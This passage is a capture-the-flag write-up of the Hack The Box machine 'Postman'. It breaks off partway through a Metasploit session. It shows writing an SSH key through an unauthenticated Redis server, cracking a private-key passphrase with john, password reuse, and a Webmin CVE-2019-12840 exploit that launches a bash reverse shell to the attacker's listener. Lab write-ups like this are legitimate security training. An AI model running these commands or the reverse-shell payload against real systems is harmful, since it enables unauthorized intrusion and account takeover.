class="line">[hg8@archbook ~]$ nmap -sV -sT -sC postman.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-22 20:34 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> postman.htb (10.10.10.160)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">10000/tcp open  ssl/http MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Postman</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 46.41 seconds</span></span><br></pre></td></tr></table></figure><p>We have the “classic”: A web app running on port 80 and the SSH port 22 open. We also have a Webmin server running on port 10000.</p><p>Opening <code>http://postman.htb</code> display the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/71326943-07d84e00-2502-11ea-904d-67647430f4dc.png" alt="postman website"></p><p>While <code>https://postman.htb:10000/</code> display the classical Webmin login page:</p><p><img src="https://user-images.githubusercontent.com/9076747/71326975-af558080-2502-11ea-9618-f52af748ddf7.png" alt="postman webmin"></p><p>Starting from there….well… There isn’t anything interesting. I run into a lot of rabbit holes without being able to find anything. </p><p>In particularly I tried running exploits against the Webmin instance including the infamous <a href="https://twitter.com/_hg8_/status/1162694712177954819">CVE-2019-15107 - Remote Code Execution via Password Reset function</a>. But I couldn’t get anything to work nor making progress any progress. </p><p>A piece of the puzzle looked missing to me. When this happen I like to restart my recon process from the beginning, to make sure I didn’t forgot anything.</p><p>Let’s start by re-running <code>nmap</code>, but this time on the top 10,000 ports:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC --top-ports 10000 postman.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-22 20:39 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> postman.htb (10.10.10.160)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 8316 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 150.41 seconds</span><br></pre></td></tr></table></figure><p>Aah that’s interesting! A new service appeared. A redis instance running on port 6379. That’s probably the missing piece of our puzzle.</p><p>Being new to redis I spent a bit of time reading articles and documentations on redis before starting anything.<br>During my research I stumbled upon this very interesting article: <a href="http://antirez.com/news/96">“A few things about Redis security”</a>.</p><p>The article, written by one of the redis dev, explain how to “<em>crack Redis for fun and no profit</em>“ on exposed redis instance with no authentication activated.</p><p>Maybe it’s our case ? First, let’s check if the redis instance need authentication:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ telnet postman.htb 6379</span><br><span class="line">Trying 10.10.10.160...</span><br><span class="line">Connected to postman.htb.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hey no AUTH required!&quot;</span></span><br><span class="line"><span class="variable">$21</span></span><br><span class="line">Hey no AUTH required!</span><br><span class="line">quit</span><br><span class="line">+OK</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure><p>Well, indeed not auth is needed to access this redis instance, that’s good news. Let’s follow the article to see if we can exploit it the same way the author present in his article.</p><p>The next step described in the article is to write our own SSH Public key into <code>~/ssh/authorized_keys</code> in order to gain access to the server.</p><p>First step is to generate a ssh key pair that we will add to the <code>authorized_keys</code> of the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh-keygen -t rsa -C <span class="string">&quot;hg8@hg8.hg8&quot;</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/hg8/.ssh/id_rsa): ./id_rsa</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> ./id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> ./id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">f0:a1:52:e9:0d:5f:e4:d9:35:33:73:43:b4:c8:b9:27 hg8@hg8.hg8</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+--[ RSA 2048]----+</span></span><br><span class="line"><span class="string">|          .   O+.|</span></span><br><span class="line"><span class="string">|       . o o..o*o|</span></span><br><span class="line"><span class="string">|      = . + .+ . |</span></span><br><span class="line"><span class="string">|     o B o    .  |</span></span><br><span class="line"><span class="string">|    . o S    E . |</span></span><br><span class="line"><span class="string">|     .        o  |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">+-----------------+</span></span><br></pre></td></tr></table></figure><p>I quote the author on this part since he explains way better than me:</p><blockquote><p>Now I’ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. But well, maybe this is not a problem. To start let’s pad the public SSH key I generated with newlines before and after the content:</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ (<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; id_rsa_with_nl.pub</span><br></pre></td></tr></table></figure><p>Now that we have all the pieces, let’s add our ssh key to the <code>authorized_keys</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 <span class="built_in">echo</span> flushall</span><br><span class="line"><span class="string">&quot;flushall&quot;</span></span><br><span class="line">[hg8@archbook ~]$ cat id_rsa_with_nl.pub | redis-cli -h 10.10.10.160 -x <span class="built_in">set</span> crackit</span><br><span class="line">OK</span><br><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dir /var/lib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">OK</span><br><span class="line">[hg8@archbook ~]$ redis-cli -h 10.10.10.160 save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>Then let’s try to login using this generated ssh key:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa redis@postman.htb</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1</span><br><span class="line">redis@Postman:~$</span><br></pre></td></tr></table></figure><h3 id="Pivot-Redis-gt-Matt"><a href="#Pivot-Redis-gt-Matt" class="headerlink" title="Pivot Redis -&gt; Matt"></a>Pivot Redis -&gt; Matt</h3><p>Ok, now we have access to the machine with <code>redis</code> user, let’s now find the user to pivot to :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ ls -l /home/Matt/</span><br><span class="line">total 4</span><br><span class="line">-rw-rw---- 1 Matt Matt 33 Aug 26 03:07 user.txt</span><br></pre></td></tr></table></figure><p><code>Matt</code> is our user. Let’s do a bit more of recon to see if we can find additional informations.</p><p>While searching around, we find an interesting backup file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:/$ cat /opt/id_rsa.bak</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>A private RSA key, we can probably use it to connect to <code>matt</code> account using SSH… Let’s pull this key to work on it offline:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp -i id_rsa redis@postman.htb:/opt/id_rsa.bak .</span><br><span class="line">id_rsa.bak  100% 1743    48.1KB/s   00:00</span><br></pre></td></tr></table></figure><p>First thing to try login through SSH on <code>Matt</code>‘s’ account with this key:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ chmod 600 id_rsa.bak</span><br><span class="line">[hg8@archbook ~]$ ssh -i id_rsa.bak Matt@postman.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa.bak&#x27;</span>:</span><br></pre></td></tr></table></figure><p>Of course a passphare is needed. Maybe we can bruteforce it? Calling <code>john</code> to the rescue:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john id_rsa.bak &gt; id_rsa.hash</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">computer2008     (id_rsa.bak)</span><br><span class="line">1g 0:00:00:12 DONE (2019-12-22 21:16) 0.08264g/s 1185Kp/s 1185Kc/s 1185KC/s *7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Good, we got a passphrase here! Let’s try to login again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa.bak Matt@postman.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa.bak&#x27;</span>:</span><br><span class="line">Connection closed by 10.10.10.160 port 22</span><br></pre></td></tr></table></figure><p>We immediately get a<code>Connection closed</code> error message upon connexion… Seems like we have the right ssh key, the right passphare but the ssh config forbid <code>Matt</code> to connect.</p><p>Let’s confirm those doubts:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ cat /etc/ssh/sshd_config</span><br><span class="line">[...]</span><br><span class="line"><span class="comment">#deny users</span></span><br><span class="line">DenyUsers Matt</span><br></pre></td></tr></table></figure><p>Alright so <code>Matt</code> is not allowed to SSH, we need to find another way to access his account.</p><p>If <code>Matt</code> reuse password we should be able switch to <code>Matt</code> from <code>Redis</code> user using <code>su</code>…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ su - Matt</span><br><span class="line">Password:</span><br><span class="line">Matt@Postman:~$ cat user.txt</span><br><span class="line">51xxxxxxxxxxxxxxxxxxxxxx3c</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Now that we have access to our user, let’s make a bit of recon to see if we can escalate our privileges to root. </p><p>After a while we can not find anything worthy onto <code>Matt</code> account. Once again, when being stuck let’s go back at beginning to make sure we don’t forget anything. Remember that Webmin instance ? It must be there for a reason…</p><p>Knowing that <code>Matt</code> reuse his password maybe we can be able to connect to Webmin using the same credentials (<code>Matt</code>:<code>computer2008</code>) ?</p><p>Let’s try to login:</p><p><img src="https://user-images.githubusercontent.com/9076747/71327015-402c5c00-2503-11ea-871c-0a5321984f47.png" alt="postman webmin login"></p><p>Success! <code>We are in...</code></p><p>From this control panel we can not access a lot… Only the <code>Software Package Updates</code> page. We can not seem to do anything interesting from there.</p><p>Knowing from the <code>nmap</code> result and the page footer, the Webmin version is <code>1.910</code>, let’s see if some exploit have been published:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit webmin</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">                                                           | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line">DansGuardian Webmin Module 0.x - <span class="string">&#x27;edit.cgi&#x27;</span> Directory Trav | exploits/cgi/webapps/23535.txt</span><br><span class="line">Webmin - Brute Force / Command Execution                   | exploits/multiple/remote/705.pl</span><br><span class="line">Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofin | exploits/linux/remote/22275.pl</span><br><span class="line">Webmin 0.x - <span class="string">&#x27;RPC&#x27;</span> Privilege Escalation                    | exploits/linux/remote/21765.pl</span><br><span class="line">Webmin 0.x - Code Input Validation                         | exploits/linux/<span class="built_in">local</span>/21348.txt</span><br><span class="line">Webmin 1.5 - Brute Force / Command Execution               | exploits/multiple/remote/746.pl</span><br><span class="line">Webmin 1.5 - Web Brute Force (CGI)                         | exploits/multiple/remote/745.pl</span><br><span class="line">Webmin 1.580 - <span class="string">&#x27;/file/show.cgi&#x27;</span> Remote Command Execution ( | exploits/unix/remote/21851.rb</span><br><span class="line">Webmin 1.850 - Multiple Vulnerabilities                    | exploits/cgi/webapps/42989.txt</span><br><span class="line">Webmin 1.900 - Remote Command Execution (Metasploit)       | exploits/cgi/remote/46201.rb</span><br><span class="line">Webmin 1.910 - <span class="string">&#x27;Package Updates&#x27;</span> Remote Command Execution  | exploits/linux/remote/46984.rb</span><br><span class="line">Webmin 1.920 - Remote Code Execution                       | exploits/linux/webapps/47293.sh</span><br><span class="line">Webmin 1.920 - Unauthenticated Remote Code Execution (Meta | exploits/linux/remote/47230.rb</span><br><span class="line">Webmin 1.x - HTML Email Command Execution                  | exploits/cgi/webapps/24574.txt</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosu | exploits/multiple/remote/1997.php</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosu | exploits/multiple/remote/2017.pl</span><br><span class="line">phpMyWebmin 1.0 - <span class="string">&#x27;target&#x27;</span> Remote File Inclusion           | exploits/php/webapps/2462.txt</span><br><span class="line">phpMyWebmin 1.0 - <span class="string">&#x27;window.php&#x27;</span> Remote File Inclusion       | exploits/php/webapps/2451.txt</span><br><span class="line">webmin 0.91 - Directory Traversal                          | exploits/cgi/remote/21183.txt</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure><p>Well well, what do we have here… <code>Webmin 1.910 - &#39;Package Updates&#39; Remote Command Execution</code>. Sounds exactly what we need! Let’s try this one.</p><p>This exploit first came as a Metasploit module, but since I try to avoid using Metasploit as much as possible I will use this <a href="https://github.com/bkaraceylan/CVE-2019-12840_POC">Python version</a>.</p><p>First, let’s open our netcat listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And let’s launch the exploit (after reading the source code, no modification seems needed to make it work properly on this box):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://github.com/bkaraceylan/CVE-2019-12840_POC.git</span><br><span class="line">Cloning into <span class="string">&#x27;CVE-2019-12840_POC&#x27;</span>...</span><br><span class="line">Unpacking objects: 100% (10/10), <span class="keyword">done</span>.</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">cd</span> CVE-2019-12840_POC</span><br><span class="line">[hg8@archbook ~]$ python exploit.py -u https://postman.htb -p 10000 -U Matt -P computer2008 -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1&quot;</span></span><br><span class="line">[*] Attempting to login...</span><br><span class="line">[*] Exploiting...</span><br><span class="line">[*] Executing payload...</span><br></pre></td></tr></table></figure><p>Aaaand a new connection open on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.160:54474</span><br><span class="line"></span><br><span class="line">root@Postman:/usr/share/webmin/package-updates/<span class="comment"># cd</span></span><br><span class="line">root@Postman:~<span class="comment"># cat root.txt</span></span><br><span class="line">a2xxxxxxxxxxxxxxxxxxxxxce</span><br></pre></td></tr></table></figure><h2 id="Additional-information"><a href="#Additional-information" class="headerlink" title="Additional information"></a>Additional information</h2><p>For the CVE-2019-12840, Metasploit could have been used the following way:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ msfconsole</span><br><span class="line">msf5 &gt; use exploit/linux/http/webmin_packageup_rce</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 